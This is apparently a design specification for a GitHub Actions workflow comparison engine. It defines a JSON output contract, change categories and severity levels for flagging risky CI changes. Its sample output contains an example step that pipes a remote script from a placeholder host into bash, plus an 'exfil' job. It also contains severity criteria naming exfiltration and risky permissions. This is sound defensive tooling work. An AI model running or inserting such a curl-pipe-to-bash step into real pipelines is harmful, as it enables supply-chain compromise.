# Structural Comparison Output Specification

- **Target Audience**: Partner A (Backend) & Partner B (React Frontend)
- **Module**: `backend/app/comparator/`
- **Output Schema**: `ComparisonResult`

---

## 1. Overview & Purpose
The **Structural Comparison Engine** compares two GitHub Actions YAML workflows (a baseline ground truth and a modified candidate) at the abstract syntax / structural AST level, rather than relying on naive raw text line diffs.

This allows Partner B's React frontend to present:
1. **High-Level Change Summary Cards**: Total additions, removals, and risk severity breakdown.
2. **Interactive Difference Tree**: Differences grouped by location (`jobs.*`, `permissions.*`, `on.*`).
3. **Actionable Findings**: Human-readable descriptions explaining *why* a structural change warrants human review, with explicit advisory severity tags.

> [!NOTE]
> **Advisory Principle**: A structural difference is never automatically labeled as "malicious." All findings represent measurable deviations that require human audit.

---

## 2. JSON Response Contract for Partner B

```json
{
  "baseline_workflow_name": "Flask CI",
  "modified_workflow_name": "Flask CI",
  "summary": {
    "total_changes": 4,
    "jobs_added": 1,
    "jobs_removed": 0,
    "steps_added": 1,
    "steps_removed": 0,
    "steps_modified": 0,
    "permissions_changed": 1,
    "triggers_changed": 0,
    "runners_changed": 1,
    "dependencies_changed": 0,
    "actions_changed": 0,
    "environments_changed": 0,
    "reusable_workflows_changed": 0,
    "has_critical_or_high_changes": true
  },
  "differences": [
    {
      "category": "permission_change",
      "location": "workflow.permissions",
      "baseline_value": {
        "contents": "read"
      },
      "modified_value": "write-all",
      "description": "Permissions escalated to broad write ('write-all'). Violates the principle of least privilege.",
      "severity": "high",
      "requires_human_review": true
    },
    {
      "category": "runner_change",
      "location": "jobs.tests.runs-on",
      "baseline_value": ["ubuntu-latest"],
      "modified_value": ["self-hosted", "linux"],
      "description": "Runner changed from GitHub-hosted to self-hosted private runner pool. Code executes on private host infrastructure.",
      "severity": "high",
      "requires_human_review": true
    },
    {
      "category": "step_addition",
      "location": "jobs.tests.steps[1]",
      "baseline_value": null,
      "modified_value": {
        "name": "Setup dependencies",
        "run": "curl -fsSL https://payload.internal/script.sh | bash",
        "is_run_command": true
      },
      "description": "Added step 'Setup dependencies'. Executes unverified remote script via shell piping ('curl | bash').",
      "severity": "high",
      "requires_human_review": true
    },
    {
      "category": "job_addition",
      "location": "jobs.extra-job",
      "baseline_value": null,
      "modified_value": {
        "runs_on": ["ubuntu-latest"],
        "steps": [
          { "run": "echo exfil" }
        ]
      },
      "description": "Added new job 'extra-job' (runs-on: ['ubuntu-latest'], steps: 1).",
      "severity": "medium",
      "requires_human_review": true
    }
  ],
  "timestamp": "2026-11-19T22:30:00.000000"
}
```

---

## 3. Data Dictionary

### 3.1 Top-Level Fields

| Field Name | Type | Description |
| :--- | :--- | :--- |
| `baseline_workflow_name` | `string \| null` | Workflow `name:` declared in baseline file. |
| `modified_workflow_name` | `string \| null` | Workflow `name:` declared in modified file. |
| `summary` | `object` | Aggregate counts of changes by category. |
| `differences` | `array[StructuralDifference]` | Ordered list of discrete structural modifications. |
| `timestamp` | `string` | ISO 8601 execution timestamp. |

### 3.2 Change Categories (`category`)

| Category Key | UI Display Name | Typical Trigger / Cause |
| :--- | :--- | :--- |
| `job_addition` | Job Added | New independent job declared in `jobs:` map. |
| `job_removal` | Job Removed | Job removed from `jobs:` map. |
| `job_configuration` | Config Changed | Timeout (`timeout-minutes`), error handling (`continue-on-error`), or strategy altered. |
| `step_addition` | Step Added | New step added inside a job. |
| `step_removal` | Step Removed | Step deleted from a job. |
| `step_modification` | Step Modified | Run command, step name, or secret references modified. |
| `permission_change` | Permissions Changed | Escalated (`write-all`, `id-token: write`) or hardened scopes. |
| `trigger_change` | Trigger Changed | Added/removed trigger (`pull_request_target`, `workflow_dispatch`, `schedule`). |
| `runner_change` | Runner Changed | Shift between GitHub-hosted (`ubuntu-latest`) and self-hosted pools. |
| `dependency_change` | Dependencies Changed | Added or deleted `needs:` gating edges between jobs. |
| `action_change` | Action Modified | Action swapped, version tag modified, or SHA pinning degraded. |
| `environment_change` | Environment Changed | Target deployment environment added or altered. |
| `reusable_workflow_change`| Reusable Workflow | External reusable workflow invocation added or changed. |

### 3.3 Advisory Severity Levels (`severity`)

| Severity | Recommended UI Color | Criteria |
| :--- | :--- | :--- |
| `critical` | Deep Red (`#D32F2F`) | Direct credential exfiltration command, unescaped injection in trigger input. |
| `high` | Red (`#F44336`) | Broad write (`write-all`), `pull_request_target` addition, self-hosted runner addition, `id-token: write`, `curl \| bash`. |
| `medium` | Amber / Orange (`#FF9800`) | Gated `needs:` dependency removed, unpinned third-party action swap, verification job removed, secret bound to env. |
| `low` | Blue (`#2196F3`) | Non-critical trigger addition (`workflow_dispatch`), minor step alterations. |
| `info` | Grey / Green (`#4CAF50`) | Permission hardening (reduction to read), timeout adjustment, cosmetic changes. |

---

## 4. Recommendations for Partner B Frontend Visualization

1. **Comparison Summary Bar**: Show badge pills with total changes, high-severity alerts (`has_critical_or_high_changes`), jobs delta, and permissions delta.
2. **Diff Table / Cards**: Render `differences` as expandable cards showing `location`, `description`, and a collapsible diff block showing `baseline_value` vs `modified_value`.
3. **Filter by Severity**: Provide tabs or filter dropdowns to filter differences by severity (`All`, `High & Critical`, `Permissions`, `Runners`).
